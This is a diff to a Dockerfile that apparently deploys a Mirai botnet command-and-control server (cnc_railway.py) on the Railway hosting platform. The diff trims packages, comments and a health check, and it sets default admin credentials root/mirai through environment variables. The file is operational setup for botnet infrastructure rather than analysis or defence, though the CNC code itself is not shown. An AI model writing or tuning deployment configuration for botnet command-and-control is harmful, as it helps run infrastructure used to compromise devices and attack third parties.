@@ -1,19 +1,15 @@
 FROM python:3.11-slim
 
-# install only what's needed
 RUN apt-get update -qq && \
     apt-get install -y -qq --no-install-recommends \
-    sqlite3 procps net-tools iptables && \
+    sqlite3 && \
     rm -rf /var/lib/apt/lists/*
 
-# create directories
 RUN mkdir -p /data /home/mirai
 
-# copy CNC
 COPY cnc_railway.py /home/mirai/cnc.py
 RUN chmod +x /home/mirai/cnc.py
 
-# Railway $PORT
 ENV PORT=8080
 ENV DB_PATH=/data/mirai.db
 ENV ADMIN_USER=root
@@ -21,10 +17,6 @@ ENV ADMIN_PASS=mirai
 
 WORKDIR /home/mirai
 
-# health check
-HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
-    CMD python3 -c "import urllib.request; urllib.request.urlopen('http://localhost:${PORT}/')" || exit 1
-
-EXPOSE ${PORT}
+EXPOSE 8080
 
 CMD ["python3", "/home/mirai/cnc.py"]
